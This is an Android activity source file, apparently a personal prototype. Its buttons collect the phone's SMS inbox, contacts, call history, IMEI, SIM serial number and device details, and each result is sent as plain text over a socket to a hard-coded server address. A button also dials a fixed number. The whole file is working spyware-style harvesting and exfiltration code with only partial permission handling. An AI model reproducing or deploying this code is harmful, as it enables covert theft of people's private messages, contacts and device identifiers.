package com.example.ideaimplementation;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends AppCompatActivity {
    private Button callButton;
    private Button sendSMSButton;
    private Button infoButton;
    private Button infoNetWorkButton;
    private Button contactsButton;
    private Button smsLogButton;
    private Button callLogButton;
    private Button showButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        callButton = findViewById(R.id.callButton);
        sendSMSButton = findViewById(R.id.sendSMSButton);
        infoButton = findViewById(R.id.infoButton);
        infoNetWorkButton = findViewById(R.id.infoNetworkButton);
        contactsButton = findViewById(R.id.contactsButton);
        smsLogButton = findViewById(R.id.smsLogButton);
        callLogButton = findViewById(R.id.callLogButton);
        showButton = findViewById(R.id.showButton);

        class BackgroundTask extends AsyncTask<String, Void, Void> {
            final String Server_ip = "192.168.0.6"; //this is my local ip address
            final int Server_port = 8080;
            Socket s;
            PrintWriter writer;

            @Override
            protected Void doInBackground(String... voids) {
                try {
                    String message = voids[0];
                    s = new Socket(Server_ip, Server_port);
                    writer = new PrintWriter(s.getOutputStream());
                    writer.write(message);
                    writer.flush();
                    writer.close();
                    //s.close();    //not now
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return null;
            }
        }

        callButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BackgroundTask b1 = new BackgroundTask();
                makeCall("01551805248");
            }
        });

        contactsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BackgroundTask b1 = new BackgroundTask();
                b1.execute(getContacts());
            }
        });

        smsLogButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BackgroundTask b1 = new BackgroundTask();
                b1.execute(getSMS());
            }
        });

        callLogButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BackgroundTask b1 = new BackgroundTask();
                b1.execute(getCallDetails());
            }
        });

        infoButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BackgroundTask b1 = new BackgroundTask();
                b1.execute(getInfoMobile());
            }
        });

        infoNetWorkButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BackgroundTask b1 = new BackgroundTask();
                b1.execute(getInfoNetwork());
            }
        });
    }

    private void makeCall(String nbr) {
        String dial = "tel:" + nbr;
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        startActivity(new Intent(Intent.ACTION_CALL, Uri.parse(dial)));
    }

    private String getSMS() {
        String sms = "\n";
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        while (c.moveToNext()) {
            sms = sms + "Number: " + c.getString(c.getColumnIndexOrThrow("address")) +
                    "\nBody: " + c.getString(c.getColumnIndexOrThrow("body")) + "\n";
        }
        c.close();
        return sms;
    }

    private String getContacts() {
        String contact = "\n";
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME);
        while (c.moveToNext()) {
            contact = contact + "Name : " + c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) +
                    "\nNumber : " + c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n";
        }
        c.close();
        return contact;
    }

    private String getCallDetails() {
        StringBuffer sb = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

        }
        Cursor cursor_managed = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = cursor_managed.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor_managed.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor_managed.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor_managed.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :\n");
        while (cursor_managed.moveToNext()) {
            String phnumber = cursor_managed.getString(number);
            String CallType = cursor_managed.getString(type);
            String CallDate = cursor_managed.getString(date);
            Date callDayTime = new Date(Long.valueOf(CallDate));
            // TODO: 9/19/2020 remove suppresslint
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
            String dateString = formatter.format(callDayTime);
            String CallDuration = cursor_managed.getString(duration);
            String dir = null;
            switch (Integer.parseInt(CallType)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("Phone number: " + phnumber + " Call type: " + dir + "\n Call date: " + dateString + " Call duration in sec: " + CallDuration);
            sb.append("\n-------------------------------\n");
        }
        cursor_managed.close();
        return sb.toString();
    }

    private String getInfoMobile() {
        return "\nDevice: " + Build.DEVICE + "\nModele: " + Build.MODEL + "\nBoard: " + Build.BOARD + "\nBootoader version: " + Build.BOOTLOADER +
                "\nBrand: " + Build.BRAND + "\nHardware: " + Build.HARDWARE;
    }

    private String getInfoNetwork() {
        String imei = null;
        String serialNo = null;
        String networkCountry = null;
        String simOperatorName = null;
        int permisI = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        if (permisI == PackageManager.PERMISSION_GRANTED) {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            imei = tm.getDeviceId().toString();
            serialNo = tm.getSimSerialNumber();
            networkCountry = tm.getNetworkCountryIso();
            simOperatorName = tm.getSimOperatorName();
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, 123);
        }
        return "\nIMEI number: " + imei + "\nSim Serial Number:" + serialNo + "\nGet Network country iso: " + networkCountry
                + "\nGet sim operatorn name: " + simOperatorName;
    }
}